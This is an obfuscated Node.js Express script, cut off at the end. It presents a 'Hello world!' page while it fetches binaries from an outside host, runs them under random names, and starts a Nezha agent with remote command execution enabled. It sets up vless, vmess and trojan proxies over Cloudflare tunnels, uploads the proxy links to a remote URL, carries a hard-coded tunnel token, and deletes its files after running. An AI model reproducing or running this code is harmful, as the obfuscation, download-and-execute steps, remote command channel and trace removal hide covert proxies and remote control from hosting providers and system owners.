const _0x277bbb=_0x31f8;(function(_0x4e889a,_0x49b6fe){const _0x295b6e=_0x31f8,_0x46d19f=_0x4e889a();while(!![]){try{const _0x157baf=-parseInt(_0x295b6e(0x232))/0x1+parseInt(_0x295b6e(0x252))/0x2+-parseInt(_0x295b6e(0x22e))/0x3*(parseInt(_0x295b6e(0x1ee))/0x4)+-parseInt(_0x295b6e(0x1a3))/0x5*(parseInt(_0x295b6e(0x22f))/0x6)+-parseInt(_0x295b6e(0x1b3))/0x7+-parseInt(_0x295b6e(0x1bc))/0x8*(-parseInt(_0x295b6e(0x21a))/0x9)+parseInt(_0x295b6e(0x20b))/0xa*(parseInt(_0x295b6e(0x206))/0xb);if(_0x157baf===_0x49b6fe)break;else _0x46d19f['push'](_0x46d19f['shift']());}catch(_0xd5771d){_0x46d19f['push'](_0x46d19f['shift']());}}}(_0x19cd,0xd79fc));const express=require('express'),app=express(),axios=require(_0x277bbb(0x22d)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x277bbb(0x1a4)),exec=promisify(require(_0x277bbb(0x1e7))[_0x277bbb(0x1cd)]),{execSync}=require(_0x277bbb(0x1e7)),UPLOAD_URL=process['env'][_0x277bbb(0x256)]||'',PROJECT_URL=process[_0x277bbb(0x201)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x277bbb(0x201)][_0x277bbb(0x239)]||![],FILE_PATH=process[_0x277bbb(0x201)][_0x277bbb(0x21e)]||_0x277bbb(0x1e5),SUB_PATH=process[_0x277bbb(0x201)][_0x277bbb(0x254)]||_0x277bbb(0x1f9),PORT=process['env'][_0x277bbb(0x266)]||process[_0x277bbb(0x201)][_0x277bbb(0x1fd)]||0xbb8,UUID=process[_0x277bbb(0x201)]['UUID']||_0x277bbb(0x1c1),NEZHA_SERVER=process[_0x277bbb(0x201)][_0x277bbb(0x20a)]||'',NEZHA_PORT=process[_0x277bbb(0x201)][_0x277bbb(0x24e)]||'',NEZHA_KEY=process[_0x277bbb(0x201)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x277bbb(0x201)][_0x277bbb(0x242)]||_0x277bbb(0x1da),ARGO_AUTH=process['env'][_0x277bbb(0x1d7)]||_0x277bbb(0x1d4),ARGO_PORT=process['env'][_0x277bbb(0x1b9)]||0x1f41,CFIP=process[_0x277bbb(0x201)][_0x277bbb(0x231)]||_0x277bbb(0x1e3),CFPORT=process[_0x277bbb(0x201)][_0x277bbb(0x1cb)]||0x1bb,NAME=process['env'][_0x277bbb(0x1dc)]||_0x277bbb(0x1f9);!fs[_0x277bbb(0x1a1)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x4f1db3=_0x277bbb,_0x366963=_0x4f1db3(0x1eb);let _0x5cae90='';for(let _0x4514c2=0x0;_0x4514c2<0x6;_0x4514c2++){_0x5cae90+=_0x366963[_0x4f1db3(0x24c)](Math[_0x4f1db3(0x1f8)](Math['random']()*_0x366963[_0x4f1db3(0x213)]));}return _0x5cae90;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x277bbb(0x1e6)](FILE_PATH,npmName),phpPath=path[_0x277bbb(0x1e6)](FILE_PATH,phpName),webPath=path[_0x277bbb(0x1e6)](FILE_PATH,webName),botPath=path[_0x277bbb(0x1e6)](FILE_PATH,botName),subPath=path[_0x277bbb(0x1e6)](FILE_PATH,_0x277bbb(0x217)),listPath=path[_0x277bbb(0x1e6)](FILE_PATH,'list.txt'),bootLogPath=path[_0x277bbb(0x1e6)](FILE_PATH,_0x277bbb(0x1b1)),configPath=path[_0x277bbb(0x1e6)](FILE_PATH,_0x277bbb(0x1ac));function deleteNodes(){const _0x3488a9=_0x277bbb;try{if(!UPLOAD_URL)return;if(!fs[_0x3488a9(0x1a1)](subPath))return;let _0x2d8331;try{_0x2d8331=fs[_0x3488a9(0x1d8)](subPath,_0x3488a9(0x1fa));}catch{return null;}const _0x1b104e=Buffer[_0x3488a9(0x22b)](_0x2d8331,_0x3488a9(0x1d2))[_0x3488a9(0x250)](_0x3488a9(0x1fa)),_0x444593=_0x1b104e['split']('\x0a')[_0x3488a9(0x24b)](_0x238ab0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x238ab0));if(_0x444593[_0x3488a9(0x213)]===0x0)return;return axios[_0x3488a9(0x22a)](UPLOAD_URL+_0x3488a9(0x246),JSON[_0x3488a9(0x21f)]({'nodes':_0x444593}),{'headers':{'Content-Type':_0x3488a9(0x262)}})['catch'](_0x195985=>{return null;}),null;}catch(_0x565a25){return null;}}function cleanupOldFiles(){const _0x436b99=_0x277bbb;try{const _0x4bbb7f=fs[_0x436b99(0x1c8)](FILE_PATH);_0x4bbb7f[_0x436b99(0x259)](_0x2744a6=>{const _0x43564c=_0x436b99,_0x36422d=path[_0x43564c(0x1e6)](FILE_PATH,_0x2744a6);try{const _0x1eda33=fs[_0x43564c(0x1f2)](_0x36422d);_0x1eda33[_0x43564c(0x204)]()&&fs[_0x43564c(0x245)](_0x36422d);}catch(_0x5bf384){}});}catch(_0x3b5f8b){}}app['get']('/',function(_0xca9db4,_0x230123){const _0x2c6423=_0x277bbb;_0x230123[_0x2c6423(0x1ae)](_0x2c6423(0x1aa));});async function generateConfig(){const _0x1627c1=_0x277bbb,_0x505a8c={'log':{'access':_0x1627c1(0x240),'error':'/dev/null','loglevel':_0x1627c1(0x1b6)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1627c1(0x244),'settings':{'clients':[{'id':UUID,'flow':_0x1627c1(0x222)}],'decryption':_0x1627c1(0x1b6),'fallbacks':[{'dest':0xbb9},{'path':_0x1627c1(0x23b),'dest':0xbba},{'path':_0x1627c1(0x1d9),'dest':0xbbb},{'path':_0x1627c1(0x24f),'dest':0xbbc}]},'streamSettings':{'network':_0x1627c1(0x1e2)}},{'port':0xbb9,'listen':_0x1627c1(0x1ad),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x1627c1(0x1b6)},'streamSettings':{'network':_0x1627c1(0x1e2),'security':_0x1627c1(0x1b6)}},{'port':0xbba,'listen':_0x1627c1(0x1ad),'protocol':_0x1627c1(0x244),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1627c1(0x1b6)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x1627c1(0x23b)}},'sniffing':{'enabled':!![],'destOverride':[_0x1627c1(0x258),'tls',_0x1627c1(0x221)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x1627c1(0x253),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1627c1(0x1d9)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1627c1(0x20d),_0x1627c1(0x221)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1627c1(0x1ad),'protocol':_0x1627c1(0x237),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1627c1(0x1b6),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x1627c1(0x221)],'metadataOnly':![]}}],'dns':{'servers':[_0x1627c1(0x1ec)]},'outbounds':[{'protocol':_0x1627c1(0x203),'tag':_0x1627c1(0x1ce)},{'protocol':_0x1627c1(0x1d1),'tag':_0x1627c1(0x1a6)}]};fs['writeFileSync'](path[_0x1627c1(0x1e6)](FILE_PATH,_0x1627c1(0x1ac)),JSON['stringify'](_0x505a8c,null,0x2));}function getSystemArchitecture(){const _0x432b75=_0x277bbb,_0x417423=os[_0x432b75(0x264)]();return _0x417423===_0x432b75(0x1ca)||_0x417423===_0x432b75(0x243)||_0x417423===_0x432b75(0x1d5)?_0x432b75(0x1ca):_0x432b75(0x216);}function downloadFile(_0x5efb18,_0xee4127,_0x51ed68){const _0x30bd10=_0x277bbb,_0x81433f=_0x5efb18;!fs['existsSync'](FILE_PATH)&&fs[_0x30bd10(0x1ff)](FILE_PATH,{'recursive':!![]});const _0x503a86=fs[_0x30bd10(0x1bd)](_0x81433f);axios({'method':_0x30bd10(0x23d),'url':_0xee4127,'responseType':'stream'})[_0x30bd10(0x1c0)](_0x10d266=>{const _0x5f4bb6=_0x30bd10;_0x10d266[_0x5f4bb6(0x1a2)][_0x5f4bb6(0x1d0)](_0x503a86),_0x503a86['on'](_0x5f4bb6(0x209),()=>{const _0x228e9b=_0x5f4bb6;_0x503a86['close'](),console[_0x228e9b(0x220)](_0x228e9b(0x21d)+path['basename'](_0x81433f)+'\x20successfully'),_0x51ed68(null,_0x81433f);}),_0x503a86['on'](_0x5f4bb6(0x218),_0xc65445=>{const _0x317df3=_0x5f4bb6;fs['unlink'](_0x81433f,()=>{});const _0x7362db=_0x317df3(0x21d)+path[_0x317df3(0x1fe)](_0x81433f)+_0x317df3(0x25b)+_0xc65445[_0x317df3(0x1b0)];console[_0x317df3(0x218)](_0x7362db),_0x51ed68(_0x7362db);});})['catch'](_0x349bb3=>{const _0x57ead4=_0x30bd10,_0x27185c=_0x57ead4(0x21d)+path[_0x57ead4(0x1fe)](_0x81433f)+'\x20failed:\x20'+_0x349bb3[_0x57ead4(0x1b0)];console['error'](_0x27185c),_0x51ed68(_0x27185c);});}async function downloadFilesAndRun(){const _0x3732f6=_0x277bbb,_0x2cfb6e=getSystemArchitecture(),_0x2f4f88=getFilesForArchitecture(_0x2cfb6e);if(_0x2f4f88[_0x3732f6(0x213)]===0x0){console[_0x3732f6(0x220)](_0x3732f6(0x25f));return;}const _0x27712f=_0x2f4f88[_0x3732f6(0x207)](_0x17f68f=>{return new Promise((_0x23d73d,_0x49ae42)=>{const _0x142f8a=_0x31f8;downloadFile(_0x17f68f[_0x142f8a(0x200)],_0x17f68f[_0x142f8a(0x205)],(_0x3172cc,_0x6e1b5a)=>{_0x3172cc?_0x49ae42(_0x3172cc):_0x23d73d(_0x6e1b5a);});});});try{await Promise[_0x3732f6(0x1e0)](_0x27712f);}catch(_0x42d17d){console[_0x3732f6(0x218)]('Error\x20downloading\x20files:',_0x42d17d);return;}function _0x49a8d0(_0x4e3882){const _0x334cc6=_0x3732f6,_0x472b29=0x1fd;_0x4e3882[_0x334cc6(0x259)](_0x15bd1c=>{const _0x453dab=_0x334cc6;fs[_0x453dab(0x1a1)](_0x15bd1c)&&fs[_0x453dab(0x1d6)](_0x15bd1c,_0x472b29,_0x447245=>{const _0x57b02d=_0x453dab;_0x447245?console[_0x57b02d(0x218)](_0x57b02d(0x223)+_0x15bd1c+':\x20'+_0x447245):console[_0x57b02d(0x220)](_0x57b02d(0x1b4)+_0x15bd1c+':\x20'+_0x472b29[_0x57b02d(0x250)](0x8));});});}const _0x32a481=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x49a8d0(_0x32a481);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x46fea4=NEZHA_SERVER[_0x3732f6(0x20e)](':')?NEZHA_SERVER[_0x3732f6(0x202)](':')[_0x3732f6(0x1f6)]():'',_0x5931a0=new Set(['443',_0x3732f6(0x248),'2096',_0x3732f6(0x211),_0x3732f6(0x241),_0x3732f6(0x1db)]),_0x472b2f=_0x5931a0[_0x3732f6(0x219)](_0x46fea4)?_0x3732f6(0x235):'false',_0x1d3862=_0x3732f6(0x228)+NEZHA_KEY+_0x3732f6(0x1f7)+NEZHA_SERVER+_0x3732f6(0x1c3)+_0x472b2f+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x3732f6(0x1e6)](FILE_PATH,_0x3732f6(0x251)),_0x1d3862);const _0x527361=_0x3732f6(0x263)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x3732f6(0x1e4);try{await exec(_0x527361),console['log'](phpName+_0x3732f6(0x1e8)),await new Promise(_0x175ced=>setTimeout(_0x175ced,0x3e8));}catch(_0x3eb08a){console[_0x3732f6(0x218)](_0x3732f6(0x1f5)+_0x3eb08a);}}else{let _0x4fa104='';const _0x1a6a55=['443','8443',_0x3732f6(0x1de),'2087','2083',_0x3732f6(0x1db)];_0x1a6a55[_0x3732f6(0x20e)](NEZHA_PORT)&&(_0x4fa104=_0x3732f6(0x208));const _0x38cfaf=_0x3732f6(0x263)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x3732f6(0x229)+NEZHA_KEY+'\x20'+_0x4fa104+_0x3732f6(0x212);try{await exec(_0x38cfaf),console[_0x3732f6(0x220)](npmName+_0x3732f6(0x1e8)),await new Promise(_0x1d28bf=>setTimeout(_0x1d28bf,0x3e8));}catch(_0x7a9f6a){console['error']('npm\x20running\x20error:\x20'+_0x7a9f6a);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x194bd=_0x3732f6(0x263)+webPath+_0x3732f6(0x224)+FILE_PATH+_0x3732f6(0x215);try{await exec(_0x194bd),console[_0x3732f6(0x220)](webName+'\x20is\x20running'),await new Promise(_0x2763f6=>setTimeout(_0x2763f6,0x3e8));}catch(_0x5b3b76){console[_0x3732f6(0x218)](_0x3732f6(0x238)+_0x5b3b76);}if(fs[_0x3732f6(0x1a1)](botPath)){let _0x479d79;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x479d79=_0x3732f6(0x21b)+ARGO_AUTH;else ARGO_AUTH[_0x3732f6(0x23e)](/TunnelSecret/)?_0x479d79=_0x3732f6(0x1a9)+FILE_PATH+_0x3732f6(0x1bb):_0x479d79='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x3732f6(0x263)+botPath+'\x20'+_0x479d79+_0x3732f6(0x24d)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x1e71f7=>setTimeout(_0x1e71f7,0x7d0));}catch(_0x5568a9){console[_0x3732f6(0x218)](_0x3732f6(0x1ab)+_0x5568a9);}}await new Promise(_0x2dfc37=>setTimeout(_0x2dfc37,0x1388));}function getFilesForArchitecture(_0x3b1d38){const _0x26fc94=_0x277bbb;let _0x4bc089;_0x3b1d38===_0x26fc94(0x1ca)?_0x4bc089=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x26fc94(0x24a)}]:_0x4bc089=[{'fileName':webPath,'fileUrl':_0x26fc94(0x1c9)},{'fileName':botPath,'fileUrl':_0x26fc94(0x1be)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x35dd6e=_0x3b1d38===_0x26fc94(0x1ca)?'https://arm64.ssss.nyc.mn/agent':_0x26fc94(0x20f);_0x4bc089[_0x26fc94(0x249)]({'fileName':npmPath,'fileUrl':_0x35dd6e});}else{const _0x3e0b6f=_0x3b1d38===_0x26fc94(0x1ca)?_0x26fc94(0x23c):_0x26fc94(0x25e);_0x4bc089[_0x26fc94(0x249)]({'fileName':phpPath,'fileUrl':_0x3e0b6f});}}return _0x4bc089;}function argoType(){const _0x28d70c=_0x277bbb;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x28d70c(0x220)](_0x28d70c(0x257));return;}if(ARGO_AUTH[_0x28d70c(0x20e)]('TunnelSecret')){fs[_0x28d70c(0x21c)](path['join'](FILE_PATH,_0x28d70c(0x1dd)),ARGO_AUTH);const _0x34a802=_0x28d70c(0x1f1)+ARGO_AUTH[_0x28d70c(0x202)]('\x22')[0xb]+_0x28d70c(0x236)+path[_0x28d70c(0x1e6)](FILE_PATH,_0x28d70c(0x1dd))+_0x28d70c(0x23a)+ARGO_DOMAIN+_0x28d70c(0x1fc)+ARGO_PORT+_0x28d70c(0x1ef);fs[_0x28d70c(0x21c)](path[_0x28d70c(0x1e6)](FILE_PATH,_0x28d70c(0x1e1)),_0x34a802);}else console[_0x28d70c(0x220)](_0x28d70c(0x25c));}async function extractDomains(){const _0x31b8f3=_0x277bbb;let _0x37a823;if(ARGO_AUTH&&ARGO_DOMAIN)_0x37a823=ARGO_DOMAIN,console[_0x31b8f3(0x220)](_0x31b8f3(0x227),_0x37a823),await _0x1b7539(_0x37a823);else try{const _0x14fd63=fs[_0x31b8f3(0x1d8)](path[_0x31b8f3(0x1e6)](FILE_PATH,_0x31b8f3(0x1b1)),_0x31b8f3(0x1fa)),_0x2aaa43=_0x14fd63[_0x31b8f3(0x202)]('\x0a'),_0x3e04d2=[];_0x2aaa43[_0x31b8f3(0x259)](_0x4507a7=>{const _0x4d4e7e=_0x31b8f3,_0x23eb7e=_0x4507a7[_0x4d4e7e(0x23e)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x23eb7e){const _0x2acdd1=_0x23eb7e[0x1];_0x3e04d2['push'](_0x2acdd1);}});if(_0x3e04d2[_0x31b8f3(0x213)]>0x0)_0x37a823=_0x3e04d2[0x0],console['log'](_0x31b8f3(0x1f4),_0x37a823),await _0x1b7539(_0x37a823);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x31b8f3(0x245)](path[_0x31b8f3(0x1e6)](FILE_PATH,_0x31b8f3(0x1b1)));async function _0x45b958(){const _0x237e52=_0x31b8f3;try{process[_0x237e52(0x1b5)]===_0x237e52(0x226)?await exec(_0x237e52(0x1c2)+botName+_0x237e52(0x225)):await exec(_0x237e52(0x1d3)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x237e52(0x265));}catch(_0x103716){}}_0x45b958(),await new Promise(_0x272f05=>setTimeout(_0x272f05,0xbb8));const _0x6e8f65=_0x31b8f3(0x1c6)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x31b8f3(0x263)+botPath+'\x20'+_0x6e8f65+_0x31b8f3(0x24d)),console[_0x31b8f3(0x220)](botName+'\x20is\x20running'),await new Promise(_0x40e1a2=>setTimeout(_0x40e1a2,0xbb8)),await extractDomains();}catch(_0x596d82){console[_0x31b8f3(0x218)](_0x31b8f3(0x1ab)+_0x596d82);}}}catch(_0x42b07b){console[_0x31b8f3(0x218)](_0x31b8f3(0x1a5),_0x42b07b);}async function _0x4316b9(){const _0x44dde8=_0x31b8f3;try{const _0x1e321d=await axios[_0x44dde8(0x23d)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x1e321d[_0x44dde8(0x1a2)]&&_0x1e321d[_0x44dde8(0x1a2)][_0x44dde8(0x230)]&&_0x1e321d[_0x44dde8(0x1a2)][_0x44dde8(0x1fb)])return _0x1e321d[_0x44dde8(0x1a2)][_0x44dde8(0x230)]+'_'+_0x1e321d[_0x44dde8(0x1a2)][_0x44dde8(0x1fb)];}catch(_0xd891b7){try{const _0x10fb24=await axios[_0x44dde8(0x23d)](_0x44dde8(0x1f0),{'timeout':0xbb8});if(_0x10fb24[_0x44dde8(0x1a2)]&&_0x10fb24[_0x44dde8(0x1a2)][_0x44dde8(0x1cc)]==='success'&&_0x10fb24[_0x44dde8(0x1a2)]['countryCode']&&_0x10fb24[_0x44dde8(0x1a2)]['org'])return _0x10fb24[_0x44dde8(0x1a2)][_0x44dde8(0x22c)]+'_'+_0x10fb24[_0x44dde8(0x1a2)][_0x44dde8(0x1fb)];}catch(_0x303fa1){}}return _0x44dde8(0x1bf);}async function _0x1b7539(_0x3997aa){const _0x32239d=await _0x4316b9(),_0x2bbd52=NAME?NAME+'-'+_0x32239d:_0x32239d;return new Promise(_0x333cb4=>{setTimeout(()=>{const _0x3f4e18=_0x31f8,_0x7992e3={'v':'2','ps':''+_0x2bbd52,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3f4e18(0x1b6),'net':'ws','type':_0x3f4e18(0x1b6),'host':_0x3997aa,'path':_0x3f4e18(0x1cf),'tls':_0x3f4e18(0x20d),'sni':_0x3997aa,'alpn':'','fp':_0x3f4e18(0x261)},_0x418af9='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x3f4e18(0x1ba)+_0x3997aa+_0x3f4e18(0x25a)+_0x3997aa+_0x3f4e18(0x1a8)+_0x2bbd52+'\x0a\x0avmess://'+Buffer[_0x3f4e18(0x22b)](JSON[_0x3f4e18(0x21f)](_0x7992e3))[_0x3f4e18(0x250)](_0x3f4e18(0x1d2))+_0x3f4e18(0x20c)+UUID+'@'+CFIP+':'+CFPORT+_0x3f4e18(0x234)+_0x3997aa+_0x3f4e18(0x25a)+_0x3997aa+_0x3f4e18(0x1df)+_0x2bbd52+_0x3f4e18(0x1c4);console[_0x3f4e18(0x220)](Buffer[_0x3f4e18(0x22b)](_0x418af9)[_0x3f4e18(0x250)](_0x3f4e18(0x1d2))),fs[_0x3f4e18(0x21c)](subPath,Buffer[_0x3f4e18(0x22b)](_0x418af9)[_0x3f4e18(0x250)](_0x3f4e18(0x1d2))),console[_0x3f4e18(0x220)](FILE_PATH+_0x3f4e18(0x210)),uploadNodes(),app[_0x3f4e18(0x23d)]('/'+SUB_PATH,(_0x28f256,_0x49add8)=>{const _0x488e32=_0x3f4e18,_0x5ed14a=Buffer[_0x488e32(0x22b)](_0x418af9)['toString'](_0x488e32(0x1d2));_0x49add8[_0x488e32(0x233)]('Content-Type',_0x488e32(0x1af)),_0x49add8[_0x488e32(0x1ae)](_0x5ed14a);}),_0x333cb4(_0x418af9);},0x7d0);});}}function _0x19cd(){const _0x4d8e9f=['2096','&path=%2Ftrojan-argo%3Fed%3D2560#','all','tunnel.yml','tcp','cdns.doon.eu.org','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','./tmp','join','child_process','\x20is\x20running','Error\x20in\x20startserver:','/api/add-nodes','abcdefghijklmnopqrstuvwxyz','https+local://8.8.8.8/dns-query','Skipping\x20adding\x20automatic\x20access\x20task','315244KCyasJ','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','http://ip-api.com/json/','\x0a\x20\x20tunnel:\x20','statSync','App\x20is\x20running','ArgoDomain:','php\x20running\x20error:\x20','pop','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','floor','windy','utf-8','org','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','PORT','basename','mkdirSync','fileName','env','split','freedom','isFile','fileUrl','1441YoUxJR','map','--tls','finish','NEZHA_SERVER','198910tOTnpo','\x0a\x0atrojan://','tls','includes','https://amd64.ssss.nyc.mn/agent','/sub.txt\x20saved\x20successfully','2087','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','length','/api/add-subscriptions','/config.json\x20>/dev/null\x202>&1\x20&','amd','sub.txt','error','has','279qIRerO','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','writeFileSync','Download\x20','FILE_PATH','stringify','log','quic','xtls-rprx-vision','Empowerment\x20failed\x20for\x20','\x20-c\x20','.exe\x20>\x20nul\x202>&1','win32','ARGO_DOMAIN:','\x0aclient_secret:\x20','\x20-p\x20','post','from','countryCode','axios','3oiLkhC','6kjEiup','country_code','CFIP','1528373PBpwHr','set','?security=tls&sni=','true','\x0a\x20\x20credentials-file:\x20','trojan','web\x20running\x20error:\x20','AUTO_ACCESS','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/vless-argo','https://arm64.ssss.nyc.mn/v1','get','match','push','/dev/null','2083','ARGO_DOMAIN','arm64','vless','unlinkSync','/api/delete-nodes','response','8443','unshift','https://arm64.ssss.nyc.mn/bot','filter','charAt','\x20>/dev/null\x202>&1\x20&','NEZHA_PORT','/trojan-argo','toString','config.yaml','1488712dzEumL','vmess','SUB_PATH','Nodes\x20uploaded\x20successfully','UPLOAD_URL','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','http','forEach','&fp=firefox&type=ws&host=','\x20failed:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x20>\x20nul\x202>&1','https://amd64.ssss.nyc.mn/v1','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','automatic\x20access\x20task\x20added\x20successfully','firefox','application/json','nohup\x20','arch','\x22\x20>\x20/dev/null\x202>&1','SERVER_PORT','existsSync','data','6025505rWhFZL','util','Error\x20reading\x20boot.log:','block','test','&path=%2Fvless-argo%3Fed%3D2560#','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Hello\x20world!','Error\x20executing\x20command:\x20','config.json','127.0.0.1','send','text/plain;\x20charset=utf-8','message','boot.log','Add\x20automatic\x20access\x20task\x20faild:\x20','7842366TBaJKy','Empowerment\x20success\x20for\x20','platform','none','Subscription\x20uploaded\x20successfully','del\x20/f\x20/q\x20','ARGO_PORT','?encryption=none&security=tls&sni=','/tunnel.yml\x20run','378256kWZyHn','createWriteStream','https://amd64.ssss.nyc.mn/bot','Unknown','then','feef54bb-e1bd-41e5-b2a7-97d278c7726b','taskkill\x20/f\x20/im\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0a\x20\x20\x20\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20>/dev/null\x202>&1','readdirSync','https://amd64.ssss.nyc.mn/web','arm','CFPORT','status','exec','direct','/vmess-argo?ed=2560','pipe','blackhole','base64','pkill\x20-f\x20\x22[','eyJhIjoiYzZhMDNkODM2YmZjOGNjZmZkZTNlMzQ5OTc2NzI5NzQiLCJ0IjoiNGM1MTkxZmEtYzA3NS00ODgxLTg3NmQtYTJmYTU1NjhmODEwIiwicyI6Ik16UTFPVEJqWkdJdE16UmhaQzAwTnpKa0xUZzRaV0l0T0RGaU1HVm1NVFUxTWpnNSJ9','aarch64','chmod','ARGO_AUTH','readFileSync','/vmess-argo','home.1tea.de5.net','2053','NAME','tunnel.json'];_0x19cd=function(){return _0x4d8e9f;};return _0x19cd();}function _0x31f8(_0x389f65,_0x575f9c){_0x389f65=_0x389f65-0x1a1;const _0x19cd8f=_0x19cd();let _0x31f817=_0x19cd8f[_0x389f65];return _0x31f817;}async function uploadNodes(){const _0x4ac010=_0x277bbb;if(UPLOAD_URL&&PROJECT_URL){const _0x38b1de=PROJECT_URL+'/'+SUB_PATH,_0x34affa={'subscription':[_0x38b1de]};try{const _0x29f8a8=await axios['post'](UPLOAD_URL+_0x4ac010(0x214),_0x34affa,{'headers':{'Content-Type':_0x4ac010(0x262)}});return _0x29f8a8&&_0x29f8a8[_0x4ac010(0x1cc)]===0xc8?(console[_0x4ac010(0x220)](_0x4ac010(0x1b7)),_0x29f8a8):null;}catch(_0x1ec5b7){if(_0x1ec5b7[_0x4ac010(0x247)]){if(_0x1ec5b7[_0x4ac010(0x247)][_0x4ac010(0x1cc)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4ac010(0x1a1)](listPath))return;const _0x349afc=fs[_0x4ac010(0x1d8)](listPath,_0x4ac010(0x1fa)),_0x419933=_0x349afc['split']('\x0a')['filter'](_0x470a34=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4ac010(0x1a7)](_0x470a34));if(_0x419933[_0x4ac010(0x213)]===0x0)return;const _0x330fec=JSON[_0x4ac010(0x21f)]({'nodes':_0x419933});try{const _0x2efada=await axios[_0x4ac010(0x22a)](UPLOAD_URL+_0x4ac010(0x1ea),_0x330fec,{'headers':{'Content-Type':'application/json'}});return _0x2efada&&_0x2efada[_0x4ac010(0x1cc)]===0xc8?(console['log'](_0x4ac010(0x255)),_0x2efada):null;}catch(_0x22afef){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x357529=_0x31f8,_0xd691d1=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xd691d1[_0x357529(0x23f)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xd691d1[_0x357529(0x23f)](phpPath);process[_0x357529(0x1b5)]===_0x357529(0x226)?exec(_0x357529(0x1b8)+_0xd691d1[_0x357529(0x1e6)]('\x20')+_0x357529(0x25d),_0x553043=>{const _0x547f59=_0x357529;console['clear'](),console[_0x547f59(0x220)](_0x547f59(0x1f3)),console[_0x547f59(0x220)](_0x547f59(0x1c5));}):exec('rm\x20-rf\x20'+_0xd691d1[_0x357529(0x1e6)]('\x20')+_0x357529(0x1c7),_0x5aa147=>{const _0x27eb31=_0x357529;console['clear'](),console[_0x27eb31(0x220)](_0x27eb31(0x1f3)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x576d69=_0x277bbb;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x576d69(0x220)](_0x576d69(0x1ed));return;}try{const _0x1b7506=await 